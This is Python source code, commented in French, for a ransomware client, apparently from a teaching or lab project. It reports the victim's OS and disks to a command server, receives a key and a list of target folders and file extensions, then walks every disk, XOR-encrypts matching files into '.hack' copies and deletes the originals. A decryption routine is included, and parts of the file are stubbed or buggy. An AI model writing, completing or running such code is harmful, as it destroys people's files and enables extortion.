import os
import utile.network as network
import utile.message as message
import utile.config as config
from platform import node, win32_edition, system
from hashlib import sha256
from re import search
from os import path
import random
import shutil
import psutil
import re
from time import time as current_time
import time

# Constantes
DEBUG_MODE = False
AES_GCM = True
PORT_SERV_FRONTAL = 8443
LAST_STATE = None


def initialize():
    """
    Procédure d'initialisation du ransomware
    :return: Néant
    """
    global LAST_STATE

    # Vérifie si un hash est enregistré, sinon génère un hash


def os_type():
    """
    Retourne le type d'operating system
    :return: None si le système n'est pas un microsoft windows ou (str) "SERVER" ou "WORKSTATION"
    """
    if search("[Ww]indows", system()):
        if search("[Ss]erver", win32_edition()):
            return "SERVER"
        else:
            return "WORKSTATION"
    return None


def list_disks():
    partitions = psutil.disk_partitions()
    # Ne filtre pas par type de disque pour inclure tous les disques connectés
    disques = [partition.device for partition in partitions]
    return disques


def explore(chemin):
    contenu = []
    if not os.path.exists(chemin):
        print("Le chemin spécifié n'existe pas.")
        return contenu

    for element in os.listdir(chemin):
        chemin_complet = os.path.join(chemin, element)
        contenu.append(chemin_complet)
        if os.path.isdir(chemin_complet):
            contenu.extend(explore(chemin_complet))
    return contenu


def file_type(fichier):
    if os.path.isdir(fichier):
        return "dir"
    else:
        return os.path.splitext(fichier)[1]


def xor_cipher(key, data):
    return bytearray(a ^ b for a, b in zip(bytearray(key), bytearray(data)))


def chiffre(fichier_source, key):
    if not os.path.exists(fichier_source):
        print("Le fichier spécifié n'existe pas.")
        return ""

    if not os.path.isfile(fichier_source):
        print("Le chemin spécifié ne correspond pas à un fichier.")
        return ""

    # Obtient le nom du fichier sans extension
    nom_fichier, extension = os.path.splitext(fichier_source)
    # Crée le nouveau nom de fichier avec l'extension .hack
    fichier_hacker = nom_fichier + ".hack"

    # Copie le contenu du fichier source vers le fichier cible
    with open(fichier_source, "rb") as file_source:
        contenu = file_source.read()
        contenu_chiffre = xor_cipher(key.encode(), contenu)

    with open(fichier_hacker, "wb") as file_hack:
        file_hack.write(contenu_chiffre)

    # Supprime le fichier source
    os.remove(fichier_source)
    print(f"Fichier source {fichier_source} supprimé.")
    return 1


def dechiffre(fichier_source, key):
    if not os.path.exists(fichier_source):
        print("Le fichier spécifié n'existe pas.")
        return ""

    if not os.path.isfile(fichier_source):
        print("Le chemin spécifié ne correspond pas à un fichier.")
        return ""

    # Obtient le nom du fichier sans extension
    nom_fichier, extension = os.path.splitext(fichier_source)
    # Crée le nouveau nom de fichier avec l'extension .hack
    fichier_hacker = nom_fichier + ".safe"

    # Copie le contenu du fichier source vers le fichier cible
    with open(fichier_source, "rb") as file:
        contenu = file.read()
        contenu_dechiffre = xor_cipher(key.encode(), contenu)

    with open(fichier_hacker, "wb") as f_dechiffre:
        f_dechiffre.write(contenu_dechiffre)

    # Supprime le fichier source
    os.remove(fichier_source)
    print(f"Fichier source {fichier_source} supprimé.")
    return 1


def simulate_hash(longueur=0):
    identifiant = f'{node()}{current_time()}'
    print(identifiant)
    return sha256(bytes()).hexdigest()


def main():
    global AES_GCM
    global DEBUG_MODE
    global IP_SERV_FRONTAL
    global PORT_SERV_FRONTAL
    global LAST_STATE

    # Load configuration
    # config.load_config('config/ransomware.cfg', 'config/ransomware.bin')
    # AES_GCM = config.get_config('AES_GCM')
    # DEBUG_MODE = config.get_config('DEBUG_MODE')
    # IP_SERV_FRONTAL = config.get_config('IP_SERV_FRONTAL')
    # PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))

    # Vérifie le dernier état sauvegardé
    LAST_STATE = config.get_config('LAST_STATE')
    if LAST_STATE is None:
        hash = config.get_config('HASH')
        if hash is None:
            hash = simulate_hash()
            config.set_config('HASH', hash)
            config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
        # Détermine le type d'OS
        system = os_type()
        if system is None:
            print("pas un windows")  # Si l'OS n'est pas un Microsoft Windows sortie du Ransomware

        # Détermine les disques disponibles
        disks = list_disks()
        print(disks)

        # Construction du message d'initialisation du RANSOMWARE
        msg = message.set_message("initialize_req", [hash, system, disks])
        # Sauvegarde des paramètres d'initialisation du Ransomware
        config.set_config('OS', system)
        config.set_config('DISKS', disks)
        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')

        # Connection vers le serveur frontal
        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)

        # Envoi de la demande d'initialisation vers le serveur frontal
        network.send_message(conn_frontal, msg)
        print("Le message : " + str(msg) + "est envoyé")  # Il envoie ini req avec le hash dedans

        # Réception de la configuration
        msg = network.receive_message(conn_frontal)
        msg_type = message.get_message_type(msg)
        conn_frontal.close()
        if msg_type == 'INITIALIZE_RESP':
            print("Message reçu est INI_RESP")
            # Sauvegarde de la configuration réceptionnée
            config.set_config('ID_DB', msg['CONFIGURE'])
            config.set_config('DISKS', msg['SETTING']['DISKS'])
            config.set_config('PATHS', msg['SETTING']['PATHS'])
            config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
            config.set_config('FREQ', msg['SETTING']['FREQ'])
            config.set_config('LAST_STATE', 'INITIALIZE')  # Signifie que la configuration est complète
            config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
            # /!\ PAS DE SAUVEGARDE DE LA CLE DE CHIFFREMENT SUR DISQUE /!\
            key_ransomware = msg['SETTING']['KEY']
            # Changement d'état du ransomware
            LAST_STATE = msg['SETTING']['STATE']

    if LAST_STATE == 'INITIALIZE':
        state_config = config.get_config('LAST_STATE')
        if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
            return None
        else:
            disks = config.get_config('DISKS')
            paths = config.get_config('PATHS')
            file_ext = config.get_config('FILE_EXT')
            nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
        if nb_files_encrypted is None:
            nb_files_encrypted = 0
        disques = [chaine.replace("'", "") for chaine in disks]
        # Enlever les guillemets simples extérieurs de chaque élément de la liste
        extensions = []
        for element in file_ext:
            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
            extensions.extend(element.replace("'", "").split(','))
        print(extensions)
        chemin = []
        for element in paths:
            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
            chemin.extend(element.replace("'", "").split(','))
        print(chemin)
        # Enlever les guillemets simples extérieurs de chaque élément de la liste
        # LAST_STATE = "CRYPT"
        # config.set_config('LAST_STATE', 'CRYPT')
        # config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
        # cryptage = True
        # while cryptage:
        #
        #     start_crypt = utile.message.set_message("CRYPT_START",hash )
        #     network.send_message(conn_frontal, start_crypt)
        #     time.sleep(5)

        # Fermeture de la connexion avec le serveur frontal

        for disk in disques:
            os.chdir(disk)
            for folder_path in chemin:
                for (root, dirs, files) in os.walk(folder_path, topdown=True):
                    for filename in files:
                        if os.path.splitext(filename)[1] in extensions:  # Si l'extension est dans les types à chiffrer
                            nb_files_encrypted += chiffre(f"\{root}\{filename}", key_ransomware)
                print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
            print("Chiffrement fait ? ")

    if LAST_STATE == 'DECRYPT':
        disks = config.get_config('DISKS')
        paths = config.get_config('PATHS')
        disques = [chaine.replace("'", "") for chaine in disks]
        # Enlever les guillemets simples extérieurs de chaque élément de la liste
        chemin = []
        for element in paths:
            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
            chemin.extend(element.replace("'", "").split(','))
        print(chemin)
        for disk in disques:
            os.chdir(disk)
            for folder_path in chemin:
                for (root, dirs, files) in os.walk(folder_path, topdown=True):
                    for filename in files:
                        if filename.endswith('.hack'):  # Si l'extension est dans les types à dechiffrer
                            dechiffre(f"\{root}\{filename}", key_ransomware)
                            print("Déchiffrement fait ")


if __name__ == '__main__':
    main()
